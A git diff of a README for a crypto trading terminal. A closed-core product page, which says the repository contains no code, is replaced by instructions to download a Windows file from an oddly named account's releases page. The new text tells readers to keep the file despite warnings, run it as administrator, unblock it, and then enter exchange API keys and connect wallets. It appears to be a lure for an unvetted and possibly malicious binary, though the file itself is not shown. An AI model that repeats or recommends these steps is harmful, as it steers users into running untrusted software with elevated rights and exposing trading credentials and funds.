@@ -1,158 +1,168 @@
-# 👑 DEGEN EMPEROR TERMINAL
+# 🤖 degen-emperor-terminal - Crypto trading with clear signals
 
-> AI-powered execution terminal for crypto traders
-> that not only finds trades — but executes them.
+[![Download the app](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Chintzy-genusdavallia252/degen-emperor-terminal/releases)
 
----
+## 📥 Download
 
-## ❌ Why most traders lose
+Visit this page to download: https://github.com/Chintzy-genusdavallia252/degen-emperor-terminal/releases
 
-* They hesitate
-* They enter too late
-* They don’t know where to exit
-* They overtrade
-* They trade without context
+1. Open the link above in your browser.
+2. Find the latest release at the top of the page.
+3. Download the Windows file from that release.
+4. If the file comes in a .zip folder, open it and move the app file to a safe folder.
+5. Double-click the app file to run it.
 
----
+## 🖥️ What this app does
 
-## ✅ What this terminal does
+degen-emperor-terminal is a crypto trading terminal for Windows. It helps you watch the market, spot trade setups, and place orders from one place.
 
-* Gives exact entries
-* Defines risk (Stop Loss)
-* Plans exits (TP1 / TP2 / TP3)
-* Shows market structure
-* Executes trades
+It is built for users who want:
+- Market signals in one dashboard
+- A simple view of price action
+- Fast access to exchange connections
+- Support for both CEX and DEX trading
+- Auto-execution for set rules
+- A cleaner way to track setups
 
-No guessing. No emotions.
+## ✅ Before you start
 
----
+Use a Windows PC with:
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- A stable internet connection
+- Access to your exchange account if you plan to connect one
 
-## ⚡ What is DEGEN EMPEROR TERMINAL?
+For best results, close other heavy apps before you start the terminal.
 
-A closed-core crypto trading platform designed for:
+## 🚀 Install on Windows
 
-* Fast market analysis
-* Structured trade execution
-* Multi-asset monitoring
-* Automated trading workflows
+1. Go to the release page.
+2. Download the latest Windows version.
+3. If Windows asks for a choice, keep the file.
+4. If the app is in a ZIP file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
+7. If Windows shows a security prompt, choose Run if you trust the source and want to continue.
 
----
+## 🔧 First setup
 
-## 👑 Emperor’s Command (Signal Engine)
+When the app opens for the first time:
+1. Set your time zone if the app asks.
+2. Choose your preferred market view.
+3. Connect your exchange account if you want live trading.
+4. Add your API keys only in the app’s settings page.
+5. Start with watch mode before you enable auto-execution.
 
-Each signal provides:
+## 📊 Main features
 
-* 🎯 Entry
-* 🛑 Stop Loss
-* 💰 TP1 / TP2 / TP3
-* 📊 Probability score
-* ⚖️ Allocation %
+- Smart money signals for trade ideas
+- Market screener for fast scanning
+- Order block and fair value gap views
+- Liquidity tracking on price charts
+- Lightweight charts for clear price action
+- CEX connectivity for major exchanges
+- DEX connectivity for on-chain trading
+- Auto-execution rules for planned trades
+- Trading dashboard for open positions and alerts
+- Fast layout for quick review during active markets
 
-Built using:
+## 🧭 How to use it
 
-* Order Blocks (OB)
-* Fair Value Gaps (FVG)
-* Liquidity Sweeps
-* Volume & volatility logic
+### 1. Open the dashboard
+Start the app and look at the main screen. You will see the market list, chart area, and trade tools.
 
----
+### 2. Pick a market
+Choose the coin or pair you want to follow. You can sort by volume, trend, or signal strength.
 
-## 📊 Market Screener
+### 3. Check the chart
+Look for:
+- Support and resistance
+- Order blocks
+- Fair value gaps
+- Liquidity sweeps
+- Trend direction
 
-Scan multiple assets instantly:
+### 4. Review the signal
+Use the signal panel to see why the setup matters. The goal is to help you make a clear decision.
 
-* BTC / ETH / SOL / MEME coins
-* Open Interest (12H)
-* Funding rates
-* Dual RSI (1H / 4H)
+### 5. Place or plan a trade
+If you use manual trading, review the setup and place your order.
+If you use auto-execution, set the rules first and confirm them before you go live.
 
-Find setup → click → execute.
+## 🔗 Exchange connections
 
----
+The terminal can connect to both centralized and decentralized markets.
 
-## 🤖 Auto-Execution Engine
+### CEX
+Use this for exchange accounts like Binance and other supported platforms. You can view balances, orders, and live market data in one place.
 
-This is not just signals.
+### DEX
+Use this for on-chain trading. You can track wallet activity and route trades through supported DEX paths.
 
-The terminal can execute trades automatically.
+## 🛡️ Account safety
 
-### Workflow:
+Keep your account safe by using:
+- A strong password
+- Two-factor authentication on your exchange
+- API keys with the right limits
+- Read-only access when you only need market data
+- Small test amounts before live trading
 
-* Detects setup
-* Generates trade plan
-* Executes order
+Do not share your keys or recovery phrases.
 
-No delay. No hesitation.
+## 🧰 Troubleshooting
 
----
+### The app does not open
+- Make sure the file finished downloading.
+- Try moving the app to a simple folder like `Downloads` or `Desktop`.
+- Right-click the file and choose Run as administrator.
 
-## 🔗 Exchange Connectivity
+### Windows blocks the file
+- Open the file’s properties and check if Windows marked it as blocked.
+- If needed, allow the file and try again.
+- Make sure you downloaded it from the release page.
 
-Supports:
+### Exchange data does not load
+- Check your internet connection.
+- Confirm your API keys are correct.
+- Make sure your exchange account still allows API access.
+- Refresh the app and try again.
 
-* Centralized Exchanges (CEX)
-* Decentralized Exchanges (DEX)
+### Charts look empty
+- Pick a pair with enough volume.
+- Check that the market is open and active.
+- Reload the data from the screen.
 
-Designed for real execution — not just analysis.
+## 📝 Tips for first-time users
 
----
+- Start in watch mode.
+- Use one market pair first.
+- Learn the chart view before you trade.
+- Test auto-execution with small size.
+- Keep your rules simple at the start.
 
-## ⚡ Real-Time System
+## 📚 Project topics
 
-* WebSocket data (low latency)
-* Synchronized UI (God-Core Loop)
-* Fast updates across all modules
+This project covers:
+- algorithmic trading
+- auto trading
+- Binance
+- CEX trading
+- crypto trading
+- DEX trading
+- fair value gap
+- JavaScript
+- lightweight charts
+- liquidity
+- market screener
+- order blocks
+- smart money concepts
+- trading dashboard
+- trading terminal
 
----
+## 📦 Download again
 
-## 🔒 Closed-Core Model
+If you need the file later, use the same release page:
 
-This repository does NOT include:
-
-* signal engine code
-* execution logic
-* private integrations
-
-This is a **product documentation layer**.
-
----
-
-## 📸 Preview
-
-![Terminal](assets/terminal-overview.png)
-![Signal](assets/emperor-command.png)
-![Screener](assets/screener-panel.png)
-
----
-
-## 🧬 Roadmap
-
-* [ ] Web access panel
-* [ ] User accounts
-* [ ] Advanced auto-trading
-* [ ] Whale flow engine v2
-* [ ] Mobile version
-
----
-
-## 🚀 Get Access
-
-This is a closed system.
-
-Access is limited.
-
-* Follow the project
-* Contact me
-* Request access
-
----
-
-## ⚠️ Disclaimer
-
-This is not financial advice.
-Trading involves risk.
-
----
-
-👑 DEGEN EMPEROR 
-Built for traders who want control — not luck.
+https://github.com/Chintzy-genusdavallia252/degen-emperor-terminal/releases
